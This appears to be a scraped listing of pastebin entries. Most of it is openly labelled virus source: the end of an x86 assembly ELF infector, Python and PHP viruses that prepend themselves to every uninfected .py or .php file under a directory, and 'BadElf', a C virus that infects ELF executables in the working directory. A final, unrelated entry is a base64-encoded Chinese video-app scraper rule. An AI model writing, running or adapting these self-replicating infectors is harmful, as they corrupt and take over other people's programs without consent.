    add edx, 7                  ; for the jmp to original entry point
    mov [edi+2080+eax+16], edx  ; overwrite the old shdr->offset with the new one (in buffer)

    add eax, 40
    sub ecx, 1
    cmp ecx, 0
    jg section_header_loop_2    ; this loop isn't necessary to make the virus function, but inspecting the host file with a readelf -a shows a clobbered symbol table and section/segment mapping

finish_infection:
    ;dword [edi+2080+24]       ; ehdr->entry (virtual address of entry point)
    ;dword [edi+2080+28]       ; ehdr->phoff (program header offset)
    ;dword [edi+2080+32]       ; ehdr->shoff (section header offset)
    ;word [edi+2080+40]        ; ehdr->ehsize (size of elf header)
    ;word [edi+2080+42]        ; ehdr->phentsize (size of one program header entry)
    ;word [edi+2080+44]        ; ehdr->phnum (number of program header entries)
    ;word [edi+2080+46]        ; ehdr->shentsize (size of one section header entry)
    ;word [edi+2080+48]        ; ehdr->shnum (number of program header entries)
    mov eax, v_stop - v_start       ; size of our virus minus the jump to original entry point
    add eax, 7                      ; for the jmp to original entry point
    mov ebx, dword [edi+2080+32]    ; the original section header offset
    add eax, ebx                    ; add the original section header offset
    mov [edi+2080+32], eax      ; overwrite the old section header offset with the new one (in buffer)

    mov eax, 5              ; sys_open
    mov ebx, edi            ; path
    add ebx, 1056           ; offset to targets in fake .bss
    add ebx, esi            ; offset of next filename
    mov ecx, 2              ; O_RDWR
    int 80h

    mov ebx, eax            ; fd
    mov eax, 4              ; sys_write
    mov ecx, edi
    add ecx, 2080           ; offset to targetfile in fake .bss
    pop edx                 ; host file up to the offset where the virus resides
    int 80h
    mov [edi+7], edx        ; place the offset of the virus in this unused section of the filename buffer

    call delta_offset
delta_offset:
    pop ebp                 ; we need to calculate our delta offset because the absolute address of v_start will differ in different host files.  This will be 0 in our original virus
    sub ebp, delta_offset

    mov eax, 4
    lea ecx, [ebp + v_start]    ; attach the virus portion (calculated with the delta offset)
    mov edx, v_stop - v_start   ; size of virus bytes
    int 80h

    pop edx                 ; original entry point of host (we'll store this double word in the same location we used for the 32 byte filename)
    mov [edi], byte 0xb8        ; op code for MOV EAX (1 byte)
    mov [edi+1], edx            ; original entry point (4 bytes)
    mov [edi+5], word 0xe0ff    ; op code for JMP EAX (2 bytes)

    mov eax, 4
    mov ecx, edi            ; offset to filename in fake .bss
    mov edx, 7              ; 7 bytes for the final jmp to the original entry point
    int 80h

    mov eax, 4              ; sys_write
    mov ecx, edi
    add ecx, 2080           ; offset to targetfile in fake .bss
    mov edx, dword [edi+7]  ; offset of the virus
    add ecx, edx            ; let's continue where we left off

    pop edx                 ; offset of last byte in targetfile in fake.bss
    sub edx, ecx            ; length of bytes to write
    int 80h

    mov eax, 36             ; sys_sync
    int 80h

    mov eax, 6              ; close file
    int 80h

    jmp infect

v_stop:
    ; virus body stop (host program start)
    mov eax, 1      ; sys_exit
    mov ebx, 0      ; normal status
    int 80h
"
hWgnUbLw,Replication Demonstration - Python,FlyFar,Python,Tuesday 4th of July 2023 08:46:13 AM CDT,"#!/usr/bin/python
import os
import datetime
SIGNATURE = ""ANARCHISM VIRUS""
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+""/""+fname):
            filestoinfect.extend(search(path+""/""+fname))
        elif fname[-3:] == "".py"":
            infected = False
            for line in open(path+""/""+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+""/""+fname)
    return filestoinfect
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = """"
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,""w"")
        f.write(virusstring + temp)
        f.close()
def bomb():
    if datetime.datetime.now().month == 9 and datetime.datetime.now().day == 11:
        print ""Anarchism is democracy taken seriously - Edward Abbey""
filestoinfect = search(os.path.abspath(""""))
infect(filestoinfect)
bomb()"
WFTUz18w,Replication Demonstration - PHP,FlyFar,PHP,Tuesday 4th of July 2023 08:44:17 AM CDT,"<?php
define(""SIGNATURE"", ""ANARCHISM"");
// determine whether backslash or forward slashes are used
define(""SLASH"", stristr($_SERVER['PWD'], ""/"") ? ""/"" : ""\\"");
$linenumber = __LINE__;
define(""STARTLINE"",$linenumber-4);
define(""ENDLINE"",$linenumber+45);
function search($path){
    $ret = """";
    $fp = opendir($path);
    while($f = readdir($fp)){
        if( preg_match(""#^\.+$#"", $f) ) continue; // ignore symbolic links
        $file_full_path = $path.SLASH.$f;
        if(is_dir($file_full_path)) { // if it's a directory, recurse
            $ret .= search($file_full_path);
        } else if( !stristr(file_get_contents($file_full_path), SIGNATURE) ) { // search for uninfected files to infect
            $ret .= $file_full_path.""\n""; 
        }
    }
    return $ret;
}
function infect($filestoinfect){
    $handle = @fopen(__FILE__, ""r"");
    $counter = 1;
    $virusstring = """";
    while(($buffer=fgets($handle,4096)) !== false){
        if($counter>=STARTLINE && $counter<=ENDLINE){
            $virusstring .= $buffer;
        }
        $counter++;
    }
    fclose($handle);
    $filesarray = array();
    $filesarray = explode(""\n"",$filestoinfect);
    foreach($filesarray AS $v){
        if(substr($v,-4)==="".php""){
            $filecontents = file_get_contents($v);
            file_put_contents($v,$virusstring.$filecontents);
        }
    }
}
function bomb(){
    if(date(""md"") == 0125){
        echo ""Anarchism is democracy taken seriously - Edward Abbey"";
    }
}
$filestoinfect = search(__DIR__);
infect($filestoinfect);
bomb();
?>"
Pbj8UKDD,BadElf - An ELF Virus - Source Code,FlyFar,C,Tuesday 4th of July 2023 08:38:02 AM CDT,"#include <stdio.h>      	// for basic IO
#include <dirent.h>       	// for directories
#include <stdbool.h>      	// macros for boolean data type
#include <sys/stat.h>     	// structure of data returned by *stat(). 
#include <sys/sendfile.h> 	// for sendfile()
#include <sys/wait.h>	  	// for waitpid()
#include <fcntl.h>        	// for file control operations 
#include <unistd.h>		// for close()

#define SIGNATURE 4033
#define SIZE 14056
#define PAYLOAD_MESSAGE ""Hello! This is a simple virus!""
#define TEMP_FILENAME "".tempFile""

void executeSomethingBad();
char* getCleanHostFile(int self_inode);
bool isOriginalVirus(int vfd);
bool isELF(char* fileName);
bool isClean(char* fileName);
void infectHostFile(char* hostFileName, int vfd);
void appendSignature(int vfd, char* fileName, mode_t mode, int size);
void executeHostPart(int vfd, mode_t mode, int totalSize, char *argv[]);

void main(int argc, char *argv[]) {
	int vfd = open(argv[0], O_RDONLY);
	struct stat st;
	fstat(vfd, &st);

	executeSomethingBad();
	
	char* cleanHostName = getCleanHostFile(st.st_ino);
	if(cleanHostName != NULL) 
		infectHostFile(cleanHostName, vfd);
		 

	if(isOriginalVirus(vfd))
		appendSignature(vfd, argv[0], st.st_mode, st.st_size);
	else
		executeHostPart(vfd, st.st_mode, st.st_size, argv);

	close(vfd);
}

/**
 * Execute malacious script
 */
void executeSomethingBad() {
	puts(PAYLOAD_MESSAGE);
}

/**
 * Returns true if this file has only the virus code
 */
bool isOriginalVirus(int vfd) {
	return SIZE == lseek(vfd, 0, SEEK_END);
}

/**
 * Gets an ELF file's name that is not yet infected in the current working directory. 
 * If no such files are found, NULL is returned
 */
char* getCleanHostFile(int self_inode) {
	struct stat st;
	DIR *dir = opendir(""./"");
	struct dirent *dp;
	while((dp = readdir(dir)) != NULL){
		stat(dp->d_name, &st);
		if(st.st_ino == self_inode) continue;	// Don't infect self
		if(isELF(dp->d_name) && isClean(dp->d_name)){
			closedir(dir);
			return dp->d_name;
		}
	}

	closedir(dir);
	return NULL;
}

/**
 * Returns true if the file's format is ELF
 * (Executeable and Linkable Format)
 * ELF files have the first four bytes as 
 * {0x7f, 'E', 'L', 'F'}.
 */
bool isELF(char* fileName) {
	if(fileName[0] == '.') return false;

	int hfd = open(fileName, O_RDONLY);
	char header[4];
	read(hfd, header, 4);
	close(hfd);

	return header[0] == 0x7f
		&& header[1] == 'E'
		&& header[2] == 'L'
		&& header[3] == 'F';
}

/**
 * Returns true if the file has not been infected yet
 * by checking the last few bytes of the file 
 */
bool isClean(char* fileName) {
	int signature;
	int fd = open(fileName, O_RDONLY);
	lseek(fd, -1 * sizeof(signature), SEEK_END);
	read(fd, &signature, sizeof(signature));
	close(fd);
	return signature != SIGNATURE;
}

/**
 * Infect host file by creating a temporary file; 
 * appending the virus/infected file, clean ELF host, and signature;
 * and replacing the host file with the temporary file.
 */
void infectHostFile(char* hostFileName, int vfd) {
	int hfd = open(hostFileName, O_RDONLY);	
	struct stat st;
	fstat(hfd, &st);
	int hostSize = st.st_size;

	int signature = SIGNATURE;
	
	int tfd = creat(TEMP_FILENAME, st.st_mode);	
	// Virus->Host->Signature
	sendfile(tfd, vfd, NULL, SIZE);
	sendfile(tfd, hfd, NULL, hostSize);
	write(tfd, &signature, sizeof(signature));

	rename(TEMP_FILENAME, hostFileName);

	close(tfd);
	close(hfd);
}

/**
 * Append signature to the virus 
 */
void appendSignature(int vfd, char* fileName, mode_t mode, int size) {
	int tfd = creat(TEMP_FILENAME, mode);
	int signature = SIGNATURE;
	lseek(vfd, 0, SEEK_SET);
	sendfile(tfd, vfd, NULL, size);
	write(tfd, &signature, sizeof(signature));
	close(tfd);
	rename(TEMP_FILENAME, fileName);
}

/**
 * Execute the original host program inside this object file
 */
void executeHostPart(int vfd, mode_t mode, int totalSize, char *argv[]) {
	int tfd = creat(TEMP_FILENAME, mode);

	lseek(vfd, SIZE, SEEK_SET);
	int signatureSize = sizeof(SIGNATURE);
	int hostSize = totalSize - SIZE - signatureSize;
	sendfile(tfd, vfd, NULL, hostSize);
	close(tfd);

	pid_t pid = fork();			
	if(pid == 0) { 			
		execv(TEMP_FILENAME, argv);
	}
	else{					
		waitpid(pid, NULL, 0);		
		unlink(TEMP_FILENAME);
	}
}"
ZKUX9tP5,邀您一起看：阿凡达2：水之道,xiaomianao666,JavaScript,Tuesday 4th of July 2023 07:07:13 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥阿凡达2：水之道@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuS6jOe6p+ino+aekFwiLFwicGF0aFwiOlwicFwiLFwicnVsZVwiOlwianM6XFxudmFyIGQgPSBbXTtcXG5sZXQgdXJsID0gYmFzZTY0RGVjb2RlKGdldFBhcmFtKFxcXCJ1XFxcIikpO1xcbmxldCBtdnRpdGxlID0gYmFzZTY0RGVjb2RlKGdldFBhcmFtKFxcXCJtb3Z0aXRsZVxcXCIpKTtcXG5sZXQgaHRtbCA9IHJlcXVlc3QodXJsKTtcXG5sZXQgYWxpc3QgPSBwZGZhKGh0bWwsIFxcXCJib2R5JiZhXFxcIik7XFxubGV0IGFyciA9IGFsaXN0Lm1hcChpdCA9PiB7XFxuICAgIHJldHVybiB7XFxuICAgICAgICAvL2h0bWw6IGl0LFxcbiAgICAgICAgdGV4dDogcGRmaChpdCwgXFxcImEmJlRleHRcXFwiKSxcXG4gICAgICAgIHRpdGxlOiBwZGZoKGl0LCBcXFwiYSYmdGl0bGVcXFwiKSxcXG4gICAgICAgIGhyZWY6IHBkKGl0LCBcXFwiYSYmaHJlZlxcXCIsIHVybClcXG4gICAgfVxcbn0pO1xcbi8vbG9nKGFycik7XFxubGV0IGRlYnVnID0gZmFsc2U7XFxuXFxuZnVuY3Rpb24gY2xlYXJUZXh0KGl0KSB7XFxuICAgIHJldHVybiBpdC5yZXBsYWNlKC/nrKx86ZuGfOeroC9nLCBcXFwiXFxcIik7XFxufVxcblxcbmZ1bmN0aW9uIGlzTW92aWUoaXQpIHtcXG4gICAgaWYgKGl0ID09IG51bGwgfHwgaXQudGV4dCA9PSBudWxsKSB7XFxuICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgIH1cXG4gICAgbGV0IHRpdCA9IGl0LnRpdGxlIHx8IFxcXCJcXFwiO1xcbiAgICBpdCA9IGl0LnRleHQgfHwgXFxcIlxcXCI7XFxuICAgIGlmIChpdCA9PSBcXFwiXFxcIiB8fCBpdC5sZW5ndGggPiA4KSB7XFxuICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgIH1cXG4gICAgLy/mjpLpmaRcXG4gICAgbGV0IHJlZyA9IC9cXFxcLnzpq5jmuIXnm7Tmkq185YaZ55yf5o6o6I2QLztcXG4gICAgaWYgKHRpdCAhPSBcXFwiXFxcIiAmJiAhdGl0LmluY2x1ZGVzKGl0KSB8fCByZWcudGVzdChpdCkpIHtcXG4gICAgICAgIHJldHVybiBmYWxzZTtcXG4gICAgfVxcbiAgICByZXR1cm4gaXQubWF0Y2goL+WOn+eUu3zlpIfnlKh86JOd5YWJfOi2hea4hXzpq5jmuIV85q2j54mHfOmfqeeJiHw0S3w0a3wxMDgwUHw3MjBQfFRDfEhEfEJELylcXG59XFxuXFxuZnVuY3Rpb24gbm90Q2hhcHRlcihpdCkge1xcbiAgICBpZiAoaXQgPT0gbnVsbCB8fCBpdC50ZXh0ID09IG51bGwpIHtcXG4gICAgICAgIHJldHVybiB0cnVlO1xcbiAgICB9XFxuICAgIHJldHVybiBpdC50ZXh0Lm1hdGNoKC9bMC05XVxcXFwuWzAtOV3liIYvKTtcXG59XFxuXFxuZnVuY3Rpb24gaXNDaGFwdGVyKGl0LCBwcmUsIG5leHQpIHtcXG4gICAgaWYgKG5vdENoYXB0ZXIoaXQpKSB7XFxuICAgICAgICAvL+S8mOWFiOaOkumZpFxcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xcbiAgICB9XFxuICAgIC8v5Yik5pat5piv5LiN5piv55S15b2xXFxuICAgIGlmIChpc01vdmllKGl0KSkge1xcbiAgICAgICAgcmV0dXJuIHRydWU7XFxuICAgIH1cXG4gICAgcmV0dXJuIGlzQ2hhcHRlcjAoaXQsIHByZSkgfHwgaXNDaGFwdGVyMChpdCwgbmV4dCk7XFxufVxcblxcbmZ1bmN0aW9uIGdldENoYXB0ZXJOdW0oaXQpIHtcXG4gICAgaWYgKGl0ID09IG51bGwgfHwgaXQudGV4dCA9PSBudWxsKSB7XFxuICAgICAgICByZXR1cm4gLTE7XFxuICAgIH1cXG4gICAgaXQgPSBpdC50ZXh0IHx8IFxcXCJcXFwiO1xcbiAgICBpZiAoaXQgPT0gXFxcIlxcXCIpIHtcXG4gICAgICAgIHJldHVybiAtMTtcXG4gICAgfVxcbiAgICBpdCA9IGNsZWFyVGV4dChpdCk7XFxuICAgIGxldCByZWcgPSAvXlswLTldKiQvO1xcbiAgICBpZiAoIXJlZy50ZXN0KGl0KSkge1xcbiAgICAgICAgcmV0dXJuIC0xO1xcbiAgICB9XFxuICAgIGl0ID0gcGFyc2VJbnQoaXQpO1xcbiAgICBpZiAoaXNOYU4oaXQpKSB7XFxuICAgICAgICByZXR1cm4gLTE7XFxuICAgIH1cXG4gICAgcmV0dXJuIGl0O1xcbn1cXG5cXG5mdW5jdGlvbiBpc0NoYXB0ZXIwKGl0LCBicm90aGVyKSB7XFxuICAgIC8qaWYgKGRlYnVnKSB7XFxuICAgICAgICBsb2coe1xcbiAgICAgICAgICAgIGl0OiBpdCxcXG4gICAgICAgICAgICBicm90aGVyOiBicm90aGVyXFxuICAgICAgICB9KTtcXG4gICAgfSovXFxuICAgIGl0ID0gZ2V0Q2hhcHRlck51bShpdCk7XFxuICAgIC8vaWYgKGRlYnVnKSBsb2coaXQpO1xcbiAgICBpZiAoaXQgPCAwKSB7XFxuICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgIH1cXG4gICAgYnJvdGhlciA9IGdldENoYXB0ZXJOdW0oYnJvdGhlcik7XFxuICAgIC8vaWYgKGRlYnVnKSBsb2coYnJvdGhlcik7XFxuICAgIGlmIChicm90aGVyIDwgMCkge1xcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xcbiAgICB9XFxuICAgIHJldHVybiBpdCAtIGJyb3RoZXIgPCAyICYmIGl0IC0gYnJvdGhlciA+IC0yO1xcbn1cXG5sZXQgdGZwdXNoID0gZ2V0SXRlbSgnd2VicHVzaCcsICcwJyk7XFxubGV0IF93ZWIgPSAkLnRvU3RyaW5nKCh0ZnB1c2gpID0+IHtcXG4gICAgbGV0IHVybHMgPSBfZ2V0VXJscygpO1xcbiAgICBsZXQgcmVnID0gL1xcXFwuaHRtbHxcXFxcLmNzc3xcXFxcLmpzLztcXG4gICAgZm9yIChsZXQgayBpbiB1cmxzKSB7XFxuICAgICAgICBpZiAoIXJlZy50ZXN0KHVybHNba10pICYmIHVybHNba10ubWF0Y2goL1xcXFwubXA0fFxcXFwubTN1OC8pKSB7XFxuICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5sb2codXJsc1trXSk7XFxuICAgICAgICAgICAgaWYgKHRmcHVzaCA9PSAnMCcpIHtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIGZ5X2JyaWRnZV9hcHAuZ2V0SGVhZGVyVXJsKHVybHNba10ucmVwbGFjZSgvLio/dXJsPS8sIFxcXCJcXFwiKSkgKyBcXFwiI2lnbm9yZUltZz10cnVlI1xcXCI7XFxuICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgbGV0IHBsYXkgPSBmeV9icmlkZ2VfYXBwLmdldEhlYWRlclVybCh1cmxzW2tdLnJlcGxhY2UoLy4qP3VybD0vLCBcXFwiXFxcIikpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vcGFnZS9wdXNoP3J1bGU9WFlR5o6o6YCBJnB1c2h1cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChKU09OLnN0cmluZ2lmeSh7XFxuICAgICAgICAgICAgICAgICAgICBcXFwibmFtZVxcXCI6IGRvY3VtZW50LnRpdGxlLFxcbiAgICAgICAgICAgICAgICAgICAgXFxcInVybFxcXCI6IHBsYXlcXG4gICAgICAgICAgICAgICAgfSkpO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG4gICAgfVxcbn0sIHRmcHVzaCk7XFxuXFxubGV0IHdlYiA9IGdldEl0ZW0oJ3dlYicsICcwJykgPT0gXFxcIjFcXFwiO1xcblxcbmZvciAobGV0IGkgPSAwOyBpIDwgYXJyLmxlbmd0aDsgaSsrKSB7XFxuICAgIGxldCBpdCA9IGFycltpXTtcXG4gICAgbGV0IHQgPSBpdC50ZXh0O1xcbiAgICBpZiAoIWl0LmhyZWYgfHwgaXQuaHJlZiA9PSBcXFwiXFxcIikge1xcbiAgICAgICAgY29udGludWU7XFxuICAgIH1cXG4gICAgbGV0IHByZSA9IGkgPT0gMCA/IG51bGwgOiBhcnJbaSAtIDFdO1xcbiAgICBsZXQgbmV4dCA9IGkgPT0gKGFyci5sZW5ndGggLSAxKSA/IG51bGwgOiBhcnJbaSArIDFdO1xcbiAgICBpZiAoaXNDaGFwdGVyKGl0LCBwcmUsIG5leHQpKSB7XFxuICAgICAgICBpZiAod2ViKSB7XFxuICAgICAgICAgICAgdmFyIHVybHggPSBcXFwid2ViUnVsZTovL1xcXCIgKyBpdC5ocmVmICsgXFxcIkBcXFwiICsgX3dlYjtcXG4gICAgICAgICAgICB2YXIgZXh0cmF4ID0ge1xcbiAgICAgICAgICAgICAgICBqc0xvYWRpbmdJbmplY3Q6IHRydWUsXFxuICAgICAgICAgICAgICAgIGlkOiBpdC5ocmVmLFxcbiAgICAgICAgICAgICAgICBibG9ja1J1bGVzOiBbJy5tNGEnLCAnLm1wMycsICcuZmx2JywgJy5hdmknLCAnLjNncCcsICcubXBlZycsICcud212JywgJy5tb3YnLCAnLnJtdmInLCAnLmdpZicsICcuanBlZycsICcucG5nJywgJy5pY28nLCAnLnN2ZyddXFxuICAgICAgICAgICAgfTtcXG4gICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgdmFyIHVybHggPSB0ZnB1c2ggPT0gJzAnID8gJ3ZpZGVvOi8vJyArIGl0LmhyZWYgOiAnaGlrZXI6Ly9wYWdlL3B1c2g/cnVsZT1YWVHmjqjpgIEmcHVzaHVybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KEpTT04uc3RyaW5naWZ5KHtcXG4gICAgICAgICAgICAgICAgXFxcIm5hbWVcXFwiOiBnZXRQYWdlVGl0bGUoKSArIHQsXFxuICAgICAgICAgICAgICAgIFxcXCJ1cmxcXFwiOiBpdC5ocmVmXFxuICAgICAgICAgICAgfSkpO1xcbiAgICAgICAgICAgIHZhciBleHRyYXggPSB7XFxuICAgICAgICAgICAgICAgIGlkOiBpdC5ocmVmXFxuICAgICAgICAgICAgfTtcXG4gICAgICAgIH1cXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IHQsXFxuICAgICAgICAgICAgdXJsOiB1cmx4LFxcbiAgICAgICAgICAgIHBoOiB0ICsgXFxcIiRcXFwiICsgaXQuaHJlZixcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfM1xcXCIsXFxuICAgICAgICAgICAgZXh0cmE6IGV4dHJheFxcbiAgICAgICAgfSk7XFxuICAgIH1cXG59XFxuaWYgKGQubGVuZ3RoID09IDApIHtcXG4gICAgLy/ljLnphY3lpLHotKVcXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiBcXFwiXFxcIixcXG4gICAgICAgIHVybDogdXJsLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJ4NV93ZWJ2aWV3X3NpbmdsZVxcXCIsXFxuICAgICAgICBkZXNjOiBcXFwiZmxvYXQmJjEwMCVcXFwiLFxcbiAgICAgICAgcGljX3VybDogXFxcIlxcXCIsXFxuICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgIGNhbkJhY2s6IHRydWVcXG4gICAgICAgIH1cXG4gICAgfSk7XFxuICAgIHRvYXN0KFxcXCJBSeWMuemFjeWksei0pe+8jOW3suS9v+eUqFg15Yqg6L29XFxcIik7XFxuICAgIHNldFJlc3VsdChkKTtcXG59IGVsc2Uge1xcbiAgICAvL+S4uue6v+i3r+WKoOWIhuWJsue6v1xcbiAgICBsZXQgZDIgPSBbXTtcXG4gICAgbGV0IG10YWIgPSBbXTtcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBkLmxlbmd0aDsgaSsrKSB7XFxuICAgICAgICBkMi5wdXNoKGRbaV0pO1xcbiAgICAgICAgbXRhYi5wdXNoKGRbaV0ucGgpO1xcbiAgICAgICAgaWYgKGkgPCBkLmxlbmd0aCAtIDEpIHtcXG4gICAgICAgICAgICBsZXQgaXQgPSBkW2ldO1xcbiAgICAgICAgICAgIGxldCB0MSA9IHBhcnNlSW50KGNsZWFyVGV4dChpdC50aXRsZSkpO1xcbiAgICAgICAgICAgIGxldCBuZXh0ID0gZFtpICsgMV07XFxuICAgICAgICAgICAgbGV0IHQyID0gcGFyc2VJbnQoY2xlYXJUZXh0KG5leHQudGl0bGUpKTtcXG4gICAgICAgICAgICBpZiAodDIgLSB0MSA+IDEgfHwgdDEgLSB0MiA+IDEpIHtcXG4gICAgICAgICAgICAgICAgbXRhYi5wdXNoKCcjJyk7XFxuICAgICAgICAgICAgICAgIGQyLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJiaWdfYmxhbmtfYmxvY2tcXFwiXFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICBkMi5wdXNoKHtcXG4gICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwibGluZV9ibGFua1xcXCJcXG4gICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgICAgIGQyLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJiaWdfYmxhbmtfYmxvY2tcXFwiXFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG4gICAgfVxcbiAgICBsZXQgcGxheWwgPSBtdGFiLmpvaW4oJyMnKS5yZXBsYWNlKC8jIyMvZywgJyQkJCQkJCcpO1xcblxcbiAgICBsZXQgZnJvbSA9IFtdO1xcbiAgICBmb3IgKHZhciBqID0gMDsgaiA8IHBsYXlsLnNwbGl0KCckJCQnKS5sZW5ndGg7IGorKykge1xcbiAgICAgICAgZnJvbS5wdXNoKFxcXCLmkq3mlL7liJfooahcXFwiICsgW2ogKyAxXSk7XFxuICAgIH1cXG4gICAgbGV0IHB1c2ggPSBKU09OLnN0cmluZ2lmeSh7XFxuICAgICAgICBcXFwibmFtZVxcXCI6IG12dGl0bGUsXFxuICAgICAgICBcXFwiZnJvbVxcXCI6IGZyb20uam9pbignJCQkJyksXFxuICAgICAgICBcXFwidXJsXFxcIjogcGxheWwucmVwbGFjZSgvXFxcXCYvZywgJ++8hu+8hicpXFxuICAgIH0pO1xcbiAgICAvL2xvZyhwdXNoKTtcXG5cXG4gICAgZDIudW5zaGlmdCh7XFxuICAgICAgICB0aXRsZTogXFxcIuaOqOmAgeW9k+WJjemhteWIl+ihqOWIsFRWQm94XFxcIixcXG4gICAgICAgIHVybDogJChwdXNoKS5sYXp5UnVsZSgoKSA9PiB7XFxuICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL3BhZ2UvcHVzaD9ydWxlPVhZUeaOqOmAgSZwdXNodXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoaW5wdXQpO1xcbiAgICAgICAgfSksXFxuICAgICAgICBjb2xfdHlwZTogXFxcInNjcm9sbF9idXR0b25cXFwiXFxuICAgIH0pO1xcblxcbiAgICBkMi51bnNoaWZ0KHtcXG4gICAgICAgIHRpdGxlOiAoZ2V0SXRlbSgnd2VicHVzaCcsICcwJykgPT0gJzEnID8gJ+WNlembhuaOqOmAgfCfn6InIDogJ+WNlembhuaOqOmAgfCflLQnKSxcXG4gICAgICAgIHVybDogYGhpa2VyOi8vZW1wdHlAbGF6eVJ1bGU9LmpzOmdldEl0ZW0oJ3dlYnB1c2gnLCcwJyk9PScxJz9zZXRJdGVtKCd3ZWJwdXNoJywnMCcpOnNldEl0ZW0oJ3dlYnB1c2gnLCcxJyk7cmVmcmVzaFBhZ2UoKTsndG9hc3Q6Ly/liIfmjaLmiJDlip/vvIEnYCxcXG5cXG4gICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbidcXG4gICAgfSk7XFxuICAgIHNldFJlc3VsdChkMik7XFxufVwifSx7XCJjb2xfdHlwZVwiOlwidGV4dF8xXCIsXCJuYW1lXCI6XCLmkJzntKLmtYvor5VcIixcInBhdGhcIjpcInNcIixcInJ1bGVcIjpcImpzOlxcbmxldCB1cmwgPSBiYXNlNjREZWNvZGUoZ2V0UGFyYW0oXFxcInVcXFwiKSk7XFxubG9nKHVybCk7XFxubGV0IGtleSA9IGdldFBhcmFtKFxcXCJrZXlcXFwiKTtcXG5sZXQgc3AgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9zcFxcXCIpO1xcbnNldFJlc3VsdChzcCh1cmwsIGtleSwgXFxcIuaQnOe0oua1i+ivlVxcXCIpKTtcIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuiBmuWQiOaQnOe0olwiLFwicGF0aFwiOlwicHJvXCIsXCJydWxlXCI6XCJ2YXIgZCA9IFtdO1xcbmlmIChNWV9QQUdFID09IDEpIHtcXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiBcXFwi5pCc57SiXFxcIixcXG4gICAgICAgIHVybDogJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICAgICAgfSksXFxuICAgICAgICBjb2xfdHlwZTogXFxcImlucHV0XFxcIixcXG4gICAgICAgIGRlc2M6IFxcXCLor7fovpPlhaXlhbPplK7or43vvIzlsL3ph4/lsJHlrZfkuI3opoHlpJrlrZdcXFwiLFxcbiAgICAgICAgcGljX3VybDogXFxcIlxcXCIsXFxuICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgIGRlZmF1bHRWYWx1ZTogZ2V0TXlWYXIoXFxcInNvdVxcXCIsIFxcXCJcXFwiKSxcXG4gICAgICAgICAgICBvbkNoYW5nZTogJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXCJzb3VcXFwiLCBpbnB1dCk7XFxuICAgICAgICAgICAgfSlcXG4gICAgICAgIH1cXG4gICAgfSk7XFxuICAgIGFkZExpc3RlbmVyKFxcXCJvbkNsb3NlXFxcIiwgJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgICBjbGVhck15VmFyKFxcXCJzb3VcXFwiKTtcXG4gICAgICAgIGNsZWFyTXlWYXIoXFxcInNvXFxcIik7XFxuICAgIH0pKTtcXG59XFxuXFxubGV0IHMgPSBnZXRNeVZhcihcXFwic291XFxcIiwgXFxcIlxcXCIpO1xcbmxldCByID0gXFxcIlxcXCI7XFxuaWYgKHMgIT0gXFxcIlxcXCIpIHtcXG4gICAgbGV0IHAgPSBNWV9